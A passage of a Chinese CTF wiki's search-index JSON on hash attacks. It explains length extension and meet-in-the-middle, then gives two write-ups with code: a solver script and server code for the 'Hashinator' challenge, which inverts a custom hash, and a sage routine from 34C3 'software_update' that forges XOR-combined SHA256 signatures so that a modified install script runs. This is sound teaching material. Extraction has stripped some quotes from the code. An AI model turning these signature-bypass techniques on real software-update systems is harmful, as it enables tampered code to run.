\u4e2d\u70b9\u4ea4\u4f1a\u653b\u51fb\u6cd5(Meet-In-The-Middle)\uff1a\u662f\u751f\u65e5\u653b\u51fb\u7684\u4e00\u79cd\u53d8\u5f62\uff0c\u4e0d\u6bd4\u8f83Hash\u503c\uff0c\u800c\u662f\u6bd4\u8f83\u4e2d\u95f4\u53d8\u91cf\u3002\u8fd9\u79cd\u653b\u51fb\u4e3b\u8981\u9002\u7528\u4e8e\u653b\u51fb\u5177\u6709\u5206\u7ec4\u94fe\u7ed3\u6784\u7684Hash\u65b9\u6848\u3002  \u5bc6\u7801\u5206\u6790\uff1a\u4f9d\u8d56\u4e8e\u5177\u4f53\u7b97\u6cd5\u7684\u8bbe\u8ba1\u7f3a\u70b9\u3002", 
            "title": "Hash Attack"
        }, 
        {
            "location": "/crypto/hash/attack/#_1", 
            "text": "HashCat \u5de5\u5177  \u53ef\u4ee5\u8bf4\u662f\u76ee\u524d\u6700\u597d\u7684\u57fa\u4e8e CPU \u548c GPU \u7834\u89e3 Hash \u7684\u8f6f\u4ef6\uff0c\u76f8\u5173\u94fe\u63a5\u5982\u4e0b  HashCat \u5b98\u7f51  HashCat \u7b80\u5355\u4f7f\u7528", 
            "title": "\u66b4\u529b\u653b\u51fb"
        }, 
        {
            "location": "/crypto/hash/attack/#hash-length-extension-attacks", 
            "text": "", 
            "title": "\u54c8\u5e0c\u957f\u5ea6\u62d3\u5c55\u653b\u51fb\uff08hash length extension attacks\uff09"
        }, 
        {
            "location": "/crypto/hash/attack/#_2", 
            "text": "\u57fa\u672c\u5b9a\u4e49\u5982\u4e0b\uff0c\u6e90\u81ea \u7ef4\u57fa\u767e\u79d1 \u3002  \u54c8\u5e0c\u957f\u5ea6\u6269\u5c55\u653b\u51fb(Hash Length Extension Attacks)\u662f\u6307\u9488\u5bf9\u67d0\u4e9b\u5141\u8bb8\u5305\u542b\u989d\u5916\u4fe1\u606f\u7684\u52a0\u5bc6\u6563\u5217\u51fd\u6570\u7684\u653b\u51fb\u624b\u6bb5\u3002\u8be5\u653b\u51fb\u9002\u7528\u4e8e\u5728 \u6d88\u606f\u4e0e\u5bc6\u94a5\u7684\u957f\u5ea6\u5df2\u77e5 \u7684\u60c5\u5f62\u4e0b\uff0c\u6240\u6709\u91c7\u53d6\u4e86 H(key \u2225 message) \u6b64\u7c7b\u6784\u9020\u7684\u6563\u5217\u51fd\u6570\u3002MD5\u548cSHA-1 \u7b49\u57fa\u4e8e Merkle\u2013Damg\u00e5rd \u6784\u9020\u7684\u7b97\u6cd5\u5747\u5bf9\u6b64\u7c7b\u653b\u51fb\u663e\u793a\u51fa\u8106\u5f31\u6027\u3002  \u8fd9\u7c7b\u54c8\u5e0c\u51fd\u6570\u6709\u4ee5\u4e0b\u7279\u70b9   \u6d88\u606f\u586b\u5145\u65b9\u5f0f\u90fd\u6bd4\u8f83\u7c7b\u4f3c\uff0c\u9996\u5148\u5728\u6d88\u606f\u540e\u9762\u6dfb\u52a0\u4e00\u4e2a1\uff0c\u7136\u540e\u586b\u5145\u82e5\u5e72\u4e2a0\uff0c\u76f4\u81f3\u603b\u957f\u5ea6\u4e0e 448 \u540c\u4f59\uff0c\u6700\u540e\u5728\u5176\u540e\u9644\u4e0a64\u4f4d\u7684\u6d88\u606f\u957f\u5ea6\uff08\u586b\u5145\u524d\uff09\u3002  \u6bcf\u4e00\u5757\u5f97\u5230\u7684\u94fe\u63a5\u53d8\u91cf\u90fd\u4f1a\u88ab\u4f5c\u4e3a\u4e0b\u4e00\u6b21\u6267\u884chash\u51fd\u6570\u7684\u521d\u59cb\u5411\u91cfIV\u3002\u5728\u6700\u540e\u4e00\u5757\u7684\u65f6\u5019\uff0c\u624d\u4f1a\u5c06\u5176\u5bf9\u5e94\u7684\u94fe\u63a5\u53d8\u91cf\u8f6c\u6362\u4e3ahash\u503c\u3002   \u4e00\u822c\u653b\u51fb\u65f6\u5e94\u6ee1\u8db3\u5982\u4e0b\u6761\u4ef6   \u6211\u4eec\u5df2\u77e5 key \u7684\u957f\u5ea6\uff0c\u5982\u679c\u4e0d\u77e5\u9053\u7684\u8bdd\uff0c\u9700\u8981\u7206\u7834\u51fa\u6765  \u6211\u4eec\u53ef\u4ee5\u63a7\u5236 message \u7684\u6d88\u606f\u3002  \u6211\u4eec\u5df2\u7ecf\u77e5\u9053\u4e86\u5305\u542b key \u7684\u4e00\u4e2a\u6d88\u606f\u7684hash\u503c\u3002   \u8fd9\u6837\u6211\u4eec\u5c31\u53ef\u4ee5\u5f97\u5230\u4e00\u5bf9(messge,x)\u6ee1\u8db3x=H(key \u2225 message)\u867d\u7136\u6211\u4eec\u5e76\u4e0d\u6e05\u695akey\u7684\u5185\u5bb9\u3002", 
            "title": "\u4ecb\u7ecd"
        }, 
        {
            "location": "/crypto/hash/attack/#_3", 
            "text": "\u8fd9\u91cc\u4e0d\u59a8\u5047\u8bbe\u6211\u4eec\u6211\u4eec\u77e5\u9053\u4e86 hash(key+s) \u7684 hash \u503c\uff0c\u5176\u4e2d s \u662f\u5df2\u77e5\u7684\uff0c\u90a3\u4e48\u5176\u672c\u8eab\u5728\u8ba1\u7b97\u7684\u65f6\u5019\uff0c\u5fc5\u7136\u4f1a\u8fdb\u884c\u586b\u5145\u3002\u90a3\u4e48\u6211\u4eec\u9996\u5148\u53ef\u4ee5\u5f97\u5230 key+s \u6269\u5c55\u540e\u7684\u5b57\u7b26\u4e32 now\uff0c\u5373  now=key|s|padding  \u90a3\u4e48\u5982\u679c\u6211\u4eec\u5728 now \u7684\u540e\u9762\u518d\u6b21\u9644\u52a0\u4e0a\u4e00\u90e8\u5206\u4fe1\u606fextra\uff0c\u5373  key|s|padding|extra  \u8fd9\u6837\u518d\u53bb\u8ba1\u7b97hash\u503c\u7684\u65f6\u5019\uff0c   \u4f1a\u5bf9 extra \u8fdb\u884c\u586b\u5145\u76f4\u5230\u6ee1\u8db3\u6761\u4ef6\u3002  \u5148\u8ba1\u7b97 now \u5bf9\u5e94\u7684\u94fe\u63a5\u53d8\u91cf IV1\uff0c\u800c\u6211\u4eec\u5df2\u7ecf\u77e5\u9053\u8fd9\u90e8\u5206\u7684 hash \u503c\uff0c\u5e76\u4e14\u94fe\u63a5\u53d8\u91cf\u4ea7\u751f hash \u503c\u7684\u7b97\u6cd5\u662f\u53ef\u9006\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5f97\u5230\u94fe\u63a5\u53d8\u91cf\u3002  \u4e0b\u9762\u4f1a\u6839\u636e\u5f97\u5230\u7684\u94fe\u63a5\u53d8\u91cf IV1\uff0c\u5bf9 extra \u90e8\u5206\u8fdb\u884c\u54c8\u5e0c\u7b97\u6cd5\uff0c\u5e76\u8fd4\u56dehash\u503c\u3002   \u90a3\u4e48\u65e2\u7136\u6211\u4eec\u5df2\u7ecf\u77e5\u9053\u4e86\u7b2c\u4e00\u90e8\u5206\u7684 hash \u503c\uff0c\u5e76\u4e14\uff0c\u6211\u4eec\u8fd8\u77e5\u9053 extra \u7684\u503c\uff0c\u90a3\u4e48\u6211\u4eec\u4fbf\u53ef\u4ee5\u5f97\u5230\u6700\u540e\u7684hash\u503c\u3002  \u800c\u4e4b\u524d\u6211\u4eec\u4e5f\u8bf4\u4e86\u6211\u4eec\u53ef\u4ee5\u63a7\u5236 message \u7684\u503c\u3002\u90a3\u4e48\u5176\u5b9e s\uff0cpadding\uff0cextra \u6211\u4eec\u90fd\u662f\u53ef\u4ee5\u63a7\u5236\u7684\u3002\u6240\u4ee5\u6211\u4eec\u81ea\u7136\u53ef\u4ee5\u627e\u5230\u5bf9\u5e94\u7684(message,x)\u6ee1\u8db3x=hash(key|message)\u3002", 
            "title": "\u653b\u51fb\u539f\u7406"
        }, 
        {
            "location": "/crypto/hash/attack/#_4", 
            "text": "\u4f3c\u4e4e\u5927\u90fd\u662fweb\u91cc\u9762\u7684\uff0c\uff0c\u4e0d\u592a\u61c2web\uff0c\u6682\u65f6\u5148\u4e0d\u7ed9\u4f8b\u5b50\u4e86\u3002", 
            "title": "\u4f8b\u5b50"
        }, 
        {
            "location": "/crypto/hash/attack/#_5", 
            "text": "hashpump   \u5982\u4f55\u4f7f\u7528\u8bf7\u53c2\u8003github\u4e0a\u7684readme\u3002", 
            "title": "\u5de5\u5177"
        }, 
        {
            "location": "/crypto/hash/attack/#hash", 
            "text": "\u4e00\u4e9b\u81ea\u5b9a\u4e49\u7684hash\u7b97\u6cd5\u53ef\u80fd\u662f\u53ef\u9006\u7684\u3002", 
            "title": "hash\u7b97\u6cd5\u8bbe\u8ba1\u6709\u8bef"
        }, 
        {
            "location": "/crypto/hash/attack/#hashinator", 
            "text": "\u9898\u76ee\u7684\u903b\u8f91\u5f88\u7b80\u5355\uff0c\u4ece\u4e00\u4e2a\u77e5\u540d\u7684\u5bc6\u7801\u5b57\u5178\"rockyou\"\u6311\u9009\u51fa\u4e00\u4e2a password \uff0c\u5e76\u4e14\u4f7f\u7528\u591a\u79cdhash\u7b97\u6cd5\u968f\u673a\u7684\u54c8\u5e0c32\u8f6e\u3002\u6211\u4eec\u9700\u8981\u4ece\u6700\u540e\u7684hash\u7ed3\u679c\u4e2d\u7834\u89e3\u51fa\u539f\u59cb\u7684 password \u3002", 
            "title": "Hashinator"
        }, 
        {
            "location": "/crypto/hash/attack/#_6", 
            "text": "\u9898\u76ee\u91c7\u7528\u7684hash\u7b97\u6cd5\u6709\uff1a md5 \uff0c sha1 \uff0c blake \uff0c scrypt \u3002\n\u5173\u952e\u7684\u4ee3\u7801\u5982\u4e0b\uff1a      password   =   self . generate_password ()       # from rock_you.txt \n     salt   =   self . generate_salt ( password )       # \u4e0epassword\u7684\u957f\u5ea6\u6709\u5173 \n     hash_rounds   =   self . generate_rounds ()      # \u751f\u6210\u8fdb\u884chash\u7b97\u6cd5\u7684\u987a\u5e8f \n     password_hash   =   self . calculate_hash ( salt   +   password ,   hash_rounds )  \n1. \u7a0b\u5e8f\u9996\u5148\u901a\u8fc7\u4ece rockyou.txt \u4e2d\u968f\u673a\u62bd\u53d6\u4e00\u4e2a password \uff0c\u4f5c\u4e3a\u52a0\u5bc6\u7684\u660e\u6587\u3002\n2. \u7136\u540e\u6839\u636e\u62bd\u53d6\u7684 password \u7684\u957f\u5ea6\uff0c\u751f\u6210\u4e00\u4e2a\u957f\u5ea6\u4e3a 128 - len(password) \u7684 salt \u3002\n3. \u4ece\u4e4b\u524d\u5217\u4e3e\u76844\u79cdhash\u7b97\u6cd5\u4e2d\u62bd\u53d6\uff0c\u7ec4\u621032\u8f6e\u7684\u54c8\u5e0c\u8fd0\u7b97\u3002\n4. \u6839\u636e\u4e4b\u524d\u5f97\u5230\u7684 password \u3001 salt \u8ba1\u7b97\u51fa\u6700\u540e\u7ed9\u6211\u4eec\u7684 password_hash \u3002  \u5f88\u660e\u663e\uff0c\u6211\u4eec\u4e0d\u53ef\u80fd\u901a\u8fc7\u9006\u5411hash\u7b97\u6cd5\u6765\u5b8c\u6210\u9898\u76ee\u3002\n\u6211\u4eec\u77e5\u9053\u6240\u6709\u7684\u53ef\u80fd\u7684\u660e\u6587\uff0c\u9996\u5148\u8003\u8651\u80fd\u5426\u901a\u8fc7\u6784\u9020\u5f69\u8679\u8868\u6765\u5b8c\u6210\u7a77\u4e3e\u3002\u4f46\u662f\u6ce8\u610f\u5230 generate_salt() \u51fd\u6570\u4e2d\uff0c salt \u548c password \u7684\u957f\u5ea6\u7ec4\u5408\u8d85\u8fc7\u4e86128byte\u7684\u957f\u5ea6\uff0c\u5e76\u4e14\u88ab\u6ce8\u91ca\u4e86     msize = 128 # f-you hashcat :D \nso\uff0c\u53ea\u80fd\u65e0\u5948\u653e\u5f03\u3002  \u90a3\u8fd9\u6837\u7684\u8bdd\uff0c\u53ea\u5b58\u5728\u4e00\u79cd\u53ef\u80fd\uff0c\u4e5f\u5373\u7b97\u6cd5\u53ef\u9006\u3002\u67e5\u770b calculate_hash() \u51fd\u6570\u7684\u5177\u4f53\u5b9e\u73b0\uff0c\u53ef\u4ee5\u53d1\u73b0\u5982\u4e0b\u53ef\u7591\u7684\u4ee3\u7801\uff1a for   i   in   range ( len ( hash_rounds )): \n     interim_salt   =   xor ( interim_salt ,   hash_rounds [ - 1 - i ]( interim_hash )) \n     interim_hash   =   xor ( interim_hash ,   hash_rounds [ i ]( interim_salt ))  final_hash   =   interim_salt   +   interim_hash  \n\u91cd\u65b0\u68b3\u7406\u4e00\u4e0b\u6211\u4eec\u77e5\u9053\u7684\u4fe1\u606f\uff1a\n1. hash_rounds\u4e2d\u4fdd\u5b58\u4e8632\u8f6e\uff0c\u5373\u6bcf\u8f6e\u8981\u4f7f\u7528\u7684hash\u51fd\u6570\u53e5\u67c4\u3002\n2. final_hash\u662f\u6700\u540e\u7ed9\u6211\u4eec\u7684hash\u7ed3\u679c\u3002\n3. hash_rounds\u4e2d\u7684\u5185\u5bb9\u4e5f\u4f1a\u5728\u751f\u6210\u4e4b\u540e\u6253\u5370\u7ed9\u6211\u4eec\u3002\n4. \u6211\u4eec\u5e0c\u671b\u5f97\u5230 interim_salt \u548c interim_hash \u5728\u7b2c\u4e00\u8f6e\u7684\u503c\u3002\n5.  interim_salt \u548c interim_hash \u7684\u957f\u5ea6\u5747\u4e3a64byte\u3002  \u4ed4\u7ec6\u89c2\u5bdf\u4e00\u4e0b interim_salt \u548c interim_hash \u7684\u8ba1\u7b97\u65b9\u6cd5\uff0c\u53ef\u4ee5\u53d1\u73b0\u5b83\u662f\u53ef\u9006\u7684\u3002   \ninterim\\_hash_1 = interim\\_hash_2 \\oplus hash\\_rounds[i](interim\\_salt_3)  \ninterim\\_hash_1 = interim\\_hash_2 \\oplus hash\\_rounds[i](interim\\_salt_3)   \u8fd9\u884c\u4ee3\u7801\u91cc\uff0c\u6211\u4eec\u5df2\u77e5  interim\\_hash_1 interim\\_hash_1  \u548c  interim\\_salt_3 interim\\_salt_3 \uff0c\u7531\u6b64\u53ef\u4ee5\u63a8\u51fa interim\\_hash_2 interim\\_hash_2 \u7684\u503c\uff0c\u800c interim\\_hash_2 interim\\_hash_2 \u5219\u662f\u4e0a\u4e00\u8f6e\u7684 interim_hash \u3002\n\u4ee5\u6b64\u65b9\u6cd5\u9006\u63a832\u6b21\uff0c\u5219\u53ef\u4ee5\u5f97\u5230\u6700\u521d\u7684 password \u548c salt \u3002  \u5177\u4f53\u7684\u89e3\u5bc6\u811a\u672c\u4e3a\uff1a import   os  import   hashlib  import   socket  import   threading  import   socketserver  import   struct  import   time  import   threading  # import pyscrypt  from   base64   import   b64encode ,   b64decode  from   pwn   import   *  def   md5 ( bytestring ): \n     return   hashlib . md5 ( bytestring ) . digest ()  def   sha ( bytestring ): \n     return   hashlib . sha1 ( bytestring ) . digest ()  def   blake ( bytestring ): \n     return   hashlib . blake2b ( bytestring ) . digest ()  def   scrypt ( bytestring ): \n     l   =   int ( len ( bytestring )   /   2 ) \n     salt   =   bytestring [: l ] \n     p   =   bytestring [ l :] \n     return   hashlib . scrypt ( p ,   salt = salt ,   n = 2 ** 16 ,   r = 8 ,   p = 1 ,   maxmem = 67111936 ) \n     # return pyscrypt.hash(p, salt, 2**16, 8, 1, dkLen=64)  def   xor ( s1 ,   s2 ): \n     return   b . join ([ bytes ([ s1 [ i ]   ^   s2 [ i   %   len ( s2 )]])   for   i   in   range ( len ( s1 ))])  def   main (): \n     # io = socket.socket(family=socket.AF_INET) \n     # io.connect(( 47.88.216.38 , 20013)) \n     io   =   remote ( 47.88.216.38 ,   20013 ) \n     print ( io . recv ( 1000 )) \n     ans_array   =   bytearray () \n     while   True : \n         buf   =   io . recv ( 1 ) \n         if   buf : \n             ans_array . extend ( buf ) \n         if   buf   ==   b ! : \n             break \n\n     password_hash_base64   =   ans_array [ ans_array . find ( b b )   +   2 :   ans_array . find ( b \\n )] \n     password_hash   =   b64decode ( password_hash_base64 ) \n     print ( password: ,   password_hash ) \n     method_bytes   =   ans_array [ \n         ans_array . find ( b used: \\n )   +   6   :   ans_array . find ( b \\n Your ) \n     ] \n     methods   =   method_bytes . split ( b \\n ) \n     methods   =   [ bytes ( x . strip ( b -  )) . decode ()   for   x   in   methods ] \n     print ( methods ) \n     in_salt   =   password_hash [: 64 ] \n     in_hash   =   password_hash [ 64 :] \n     for   pos ,   neg   in   zip ( methods ,   methods [:: - 1 ]): \n                      interim_salt = xor(interim_salt, hash_rounds[-1-i](interim_hash))              interim_hash = xor(interim_hash, hash_rounds[i](interim_salt))           \n         in_hash   =   xor ( in_hash ,   eval ( {}(in_salt) . format ( neg ))) \n         in_salt   =   xor ( in_salt ,   eval ( {}(in_hash) . format ( pos ))) \n     print ( in_hash ,   in_salt ) \n     print ( in_hash [ - 20 :]) \n     io . interactive ()  main ()", 
            "title": "\u5206\u6790"
        }, 
        {
            "location": "/crypto/hash/attack/#hash_1", 
            "text": "import   os  import   hashlib  import   socket  import   threading  import   socketserver  import   struct  import   time  # import pyscrypt  from   base64   import   b64encode  def   md5 ( bytestring ): \n     return   hashlib . md5 ( bytestring ) . digest ()  def   sha ( bytestring ): \n     return   hashlib . sha1 ( bytestring ) . digest ()  def   blake ( bytestring ): \n     return   hashlib . blake2b ( bytestring ) . digest ()  def   scrypt ( bytestring ): \n     l   =   int ( len ( bytestring )   /   2 ) \n     salt   =   bytestring [: l ] \n     p   =   bytestring [ l :] \n     return   hashlib . scrypt ( p ,   salt = salt ,   n = 2 ** 16 ,   r = 8 ,   p = 1 ,   maxmem = 67111936 ) \n     # return pyscrypt.hash(p, salt, 2**16, 8, 1)  def   xor ( s1 ,   s2 ): \n     return   b . join ([ bytes ([ s1 [ i ]   ^   s2 [ i   %   len ( s2 )]])   for   i   in   range ( len ( s1 ))])  class   HashHandler ( socketserver . BaseRequestHandler ): \n\n     welcome_message   =    Welcome, young wanna-be Cracker, to the Hashinator.  To prove your worthiness, you must display the power of your cracking skills.  The test is easy:  1. We send you a password from the rockyou list, hashed using multiple randomly chosen algorithms.  2. You crack the hash and send back the original password.  As you already know the dictionary and won t need any fancy password rules, {} seconds should be plenty, right?  Please wait while we generate your hash...       \n\n     hashes   =   [ md5 ,   sha ,   blake ,   scrypt ] \n     timeout   =   10 \n     total_rounds   =   32 \n\n     def   handle ( self ): \n         self . request . sendall ( self . welcome_message . format ( self . timeout ) . encode ()) \n\n         password   =   self . generate_password ()       # from rock_you.txt \n         salt   =   self . generate_salt ( password )       # \u4e0epassword\u7684\u957f\u5ea6\u6709\u5173 \n         hash_rounds   =   self . generate_rounds ()      # \u751f\u6210\u8fdb\u884chash\u7b97\u6cd5\u7684\u987a\u5e8f \n         password_hash   =   self . calculate_hash ( salt   +   password ,   hash_rounds ) \n         self . generate_delay () \n\n         self . request . sendall ( Challenge password hash: {} \\n . format ( b64encode ( password_hash )) . encode ()) \n         self . request . sendall ( Rounds used: \\n . encode ()) \n         test_rounds   =   [] \n         for   r   in   hash_rounds : \n             test_rounds . append ( r ) \n\n         for   r   in   hash_rounds : \n             self . request . sendall ( - {} \\n . format ( r . __name__ ) . encode ()) \n         self . request . sendall ( Your time starts now! \\n . encode ()) \n         self . request . settimeout ( self . timeout ) \n         try : \n             response   =   self . request . recv ( 1024 ) \n             if   response . strip ()   ==   password : \n                 self . request . sendall ( Congratulations! You are a true cracking master! \\n . encode ()) \n                 self . request . sendall ( Welcome to the club: {} \\n . format ( flag ) . encode ()) \n                 return \n         except   socket . timeout : \n             pass \n         self . request . sendall ( Your cracking skills are bad, and you should feel bad! . encode ()) \n\n\n     def   generate_password ( self ): \n         rand   =   struct . unpack ( I ,   os . urandom ( 4 ))[ 0 ] \n         lines   =   14344391   # size of rockyou \n         line   =   rand   %   lines \n         password   =   \n         f   =   open ( rockyou.txt ,   rb ) \n         for   i   in   range ( line ): \n             password   =   f . readline () \n         return   password . strip () \n\n     def   generate_salt ( self ,   p ): \n         msize   =   128   # f-you hashcat :D \n         salt_size   =   msize   -   len ( p ) \n         return   os . urandom ( salt_size ) \n\n     def   generate_rounds ( self ): \n         rand   =   struct . unpack ( Q ,   os . urandom ( 8 ))[ 0 ] \n         rounds   =   [] \n         for   i   in   range ( self . total_rounds ): \n             rounds . append ( self . hashes [ rand   %   len ( self . hashes )]) \n             rand   =   rand     2 \n         return   rounds \n\n     def   calculate_hash ( self ,   payload ,   hash_rounds ): \n         interim_salt   =   payload [: 64 ] \n         interim_hash   =   payload [ 64 :] \n         for   i   in   range ( len ( hash_rounds )): \n             interim_salt   =   xor ( interim_salt ,   hash_rounds [ - 1 - i ]( interim_hash )) \n             interim_hash   =   xor ( interim_hash ,   hash_rounds [ i ]( interim_salt )) \n                          interim_hash = xor(                  interim_hash,                  hash_rounds[i](                      xor(interim_salt, hash_rounds[-1-i](interim_hash))                  )              )               \n         final_hash   =   interim_salt   +   interim_hash \n         return   final_hash \n\n     def   generate_delay ( self ): \n         rand   =   struct . unpack ( I ,   os . urandom ( 4 ))[ 0 ] \n         time . sleep ( rand   /   1000000000.0 )  class   ThreadedTCPServer ( socketserver . ThreadingMixIn ,   socketserver . TCPServer ): \n     allow_reuse_address   =   True  PORT   =   1337  HOST   =   0.0.0.0  flag   =    with   open ( flag.txt )   as   f : \n     flag   =   f . read ()  def   main (): \n     server   =   ThreadedTCPServer (( HOST ,   PORT ),   HashHandler ) \n     server_thread   =   threading . Thread ( target = server . serve_forever ) \n     server_thread . start () \n     server_thread . join ()  if   __name__   ==   __main__ : \n     main ()", 
            "title": "\u539fhash\u7b97\u6cd5"
        }, 
        {
            "location": "/crypto/hash/complex/", 
            "text": "\u7efc\u5408\u9898\u76ee\n\n\n2017 34c3 Software_update\n\n\n\u53ef\u4ee5\u770b\u51fa\uff0c\u7a0b\u5e8f\u7684\u5927\u6982\u610f\u601d\u662f\u4e0a\u4f20\u4e00\u4e2a zip \u538b\u7f29\u5305\uff0c\u7136\u540e\u5bf9 signed_data \u76ee\u5f55\u4e0b\u7684\u6587\u4ef6\u8fdb\u884c\u7b7e\u540d\u9a8c\u8bc1\u3002\u5176\u4e2d\uff0c\u6700\u540e\u9a8c\u8bc1\u7684\u624b\u6cd5\u662f\u5927\u6982\u662f\u5c06\u6bcf\u4e00\u4e2a\u6587\u4ef6\u8fdb\u884c sha256 \u54c8\u5e0c\uff0c\u7136\u540e\n\u5f02\u6216\n\u8d77\u6765\u4f5c\u4e3a\u8f93\u5165\u4f20\u9012\u7ed9 rsa \u8fdb\u884c\u7b7e\u540d\u3002\u5982\u679c\u901a\u8fc7\u9a8c\u8bc1\u7684\u8bdd\uff0c\u5c31\u4f1a\u6267\u884c\u5bf9\u5e94\u7684 pre-copy.py \u548c post-copy.py \u6587\u4ef6\u3002\n\n\n\u5f88\u81ea\u7136\u7684\u60f3\u6cd5\u662f\u6211\u4eec\u4fee\u6539 pre-copy.py \u6216\u8005 post-copy.py \u6587\u4ef6\uff0c\u4f7f\u5176\u53ef\u4ee5\u8bfb\u53d6 flag\uff0c\u7136\u540e\u518d\u6b21\u7ed5\u8fc7\u7b7e\u540d\u5373\u53ef\u3002\u4e3b\u8981\u6709\u4e24\u79cd\u601d\u8def\n\n\n\n\n\u6839\u636e\u7ed9\u5b9a\u7684\u516c\u94a5\u6587\u4ef6\u83b7\u53d6\u5bf9\u5e94\u7684\u79c1\u94a5\uff0c\u8fdb\u800c\u518d\u4fee\u6539\u6587\u4ef6\u540e\u4f2a\u9020\u7b7e\u540d\uff0c\u7136\u540e\u5927\u6982\u770b\u4e86\u770b\u516c\u94a5\u6587\u4ef6\u51e0\u4e4e\u4e0d\u53ef\u7834\uff0c\u6240\u4ee5\u8fd9\u4e00\u70b9\uff0c\u57fa\u672c\u4e0a\u53ef\u4ee5\u653e\u5f03\u3002\n\n\n\u4fee\u6539\u5bf9\u5e94\u6587\u4ef6\u540e\uff0c\u5229\u7528\n\u5f02\u6216\u7684\u7279\u6027\u4f7f\u5f97\u5176\u54c8\u5e0c\u503c\u4ecd\u7136\u4e0e\u539f\u6765\u76f8\u540c\n\uff0c\u4ece\u800c\u7ed5\u8fc7\u7b7e\u540d\u68c0\u6d4b\u3002\u5373\u4f7f\u5f97 signed_data \u76ee\u5f55\u4e0b\u5305\u542b\u591a\u4e2a\u6587\u4ef6\uff0c\u4f7f\u5f97\u8fd9\u4e9b\u6587\u4ef6\u7684\u54c8\u5e0c\u503c\u6700\u540e\u5f02\u6216\u8d77\u6765\u53ef\u4ee5\u62b5\u6d88\u4fee\u6539 pre-copy.py \u6216\u8005 post-copy.py\u6587\u4ef6\u6240\u9020\u6210\u7684\u54c8\u5e0c\u503c\u7684\u4e0d\u540c\u3002\n\n\n\n\n\u8fd9\u91cc\uff0c\u6211\u4eec\u9009\u62e9\u7b2c\u4e8c\u79cd\u65b9\u6cd5\uff0c\u8fd9\u91cc\u6211\u4eec\u9009\u62e9\u4fee\u6539 pre-copy.py \u6587\u4ef6\uff0c\u5177\u4f53\u601d\u8def\u5982\u4e0b\n\n\n\n\n\u8ba1\u7b97 pre-copy.py \u7684\u539f hash \u503c\u3002\n\n\n\u4fee\u6539 pre-copy.py \u6587\u4ef6\uff0c\u4f7f\u5176\u53ef\u4ee5\u8bfb\u53d6 flag\u3002\u4e0e\u6b64\u540c\u65f6\uff0c\u8ba1\u7b97\u65b0\u7684 hash \u503c\u3002\u5c06\u4e24\u8005\u5f02\u6216\uff0c\u6c42\u5f97\u5f02\u6216\u5dee\u503c delta\u3002\n\n\n\u5bfb\u627e\u4e00\u7cfb\u5217\u7684\u6587\u4ef6\uff0c\u4f7f\u5176 hash \u503c\u5f02\u6216\u8d77\u6765\u6b63\u597d\u4e3a delta\u3002\n\n\n\n\n\u5173\u952e\u7684\u6b65\u9aa4\u5728\u4e8e\u7b2c\u4e09\u6b65\uff0c\u800c\u5176\u5b9e\u8fd9\u4e2a\u6587\u4ef6\u53ef\u4ee5\u770b\u505a\u662f\u4e00\u4e2a\u7ebf\u6027\u7ec4\u5408\u7684\u95ee\u9898\uff0c\u5373\u5bfb\u627e\u82e5\u5e72\u4e2a 256 \u7ef401\u5411\u91cf\u4f7f\u5176\u5f02\u6216\u503c\u4e3a delta\u3002\u800c \n$$\n(F={0,1},F^{256},\\oplus ,\\cdot)\n$$\n\u662f\u4e00\u4e2a 256 \u7ef4\u7684\u5411\u91cf\u7a7a\u95f4\u3002\u5982\u679c\u6211\u4eec\u53ef\u4ee5\u6c42\u5f97\u8be5\u5411\u91cf\u7a7a\u95f4\u7684\u4e00\u4e2a\u57fa\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u6c42\u5f97\u8be5\u7a7a\u95f4\u4e2d\u4efb\u610f\u6307\u5b9a\u503c\u7684\u6240\u9700\u8981\u7684\u5411\u91cf\u3002\n\n\n\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 sage \u6765\u8f85\u52a9\u6211\u4eec\u6c42\uff0c\u5982\u4e0b\n\n\n# generage the base of \n{0,1},F^256,xor,*\n\n\ndef\n \ngen_gf2_256_base\n():\n\n    \nv\n \n=\n \nVectorSpace\n(\nGF\n(\n2\n),\n \n256\n)\n\n    \ntmphash\n \n=\n \ncompute_file_hash\n(\n0.py\n,\n \n)\n\n    \ntmphash_bin\n \n=\n \nhash2bin\n(\ntmphash\n)\n\n    \nbase\n \n=\n \n[\ntmphash_bin\n]\n\n    \nfilelist\n \n=\n \n[\n0.py\n]\n\n    \nprint\n \nbase\n\n    \ns\n \n=\n \nv\n.\nsubspace\n(\nbase\n)\n\n    \ndim\n \n=\n \ns\n.\ndimension\n()\n\n    \ncnt\n \n=\n \n1\n\n    \nwhile\n \ndim\n \n!=\n \n256\n:\n\n        \ntmpfile\n \n=\n \nstr\n(\ncnt\n)\n \n+\n \n.py\n\n        \ntmphash\n \n=\n \ncompute_file_hash\n(\ntmpfile\n,\n \n)\n\n        \ntmphash_bin\n \n=\n \nhash2bin\n(\ntmphash\n)\n\n        \nold_dim\n \n=\n \ndim\n\n        \ns\n \n=\n \nv\n.\nsubspace\n(\nbase\n \n+\n \n[\ntmphash_bin\n])\n\n        \ndim\n \n=\n \ns\n.\ndimension\n()\n\n        \nif\n \ndim\n \n \nold_dim\n:\n\n            \nbase\n \n+=\n \n[\ntmphash_bin\n]\n\n            \nfilelist\n.\nappend\n(\ntmpfile\n)\n\n            \nprint\n(\ndimension \n \n+\n \nstr\n(\ns\n.\ndimension\n()))\n\n        \ncnt\n \n+=\n \n1\n\n        \nprint\n(\ncnt\n)\n\n    \nm\n \n=\n \nmatrix\n(\nGF\n(\n2\n),\n \n256\n,\n \n256\n,\n \nbase\n)\n\n    \nm\n \n=\n \nm\n.\ntranspose\n()\n\n    \nreturn\n \nm\n,\n \nfilelist\n\n\n\n\n\n\u5173\u4e8e\u66f4\u52a0\u8be6\u7ec6\u7684\u89e3\u7b54\uff0c\u8bf7\u53c2\u8003 \nexp.py\n\u3002\n\n\n\u8fd9\u91cc\u6211\u4fee\u6539 pre-copy \u591a\u8f93\u51fa  \n!!!!come here!!!!\n \u5b57\u773c\uff0c\u5982\u4e0b\n\n\n\u279c  software_update git:\n(\nmaster\n)\n python3 installer.py now.zip\nPreparing to copy data...\n!!!!come here!!!!\nSoftware update installed successfully.\n\n\n\n\n\u53c2\u8003\u6587\u732e\n\n\n\n\nhttps://sectt.github.io/writeups/34C3CTF/crypto_182_software_update/Readme\n\n\nhttps://github.com/OOTS/34c3ctf/blob/master/software_update/solution/exploit.py", 
            "title": "\u7efc\u5408"
        }, 
        {
            "location": "/crypto/hash/complex/#_1", 
            "text": "", 
            "title": "\u7efc\u5408\u9898\u76ee"
        }, 
        {
            "location": "/crypto/hash/complex/#2017-34c3-software_update", 
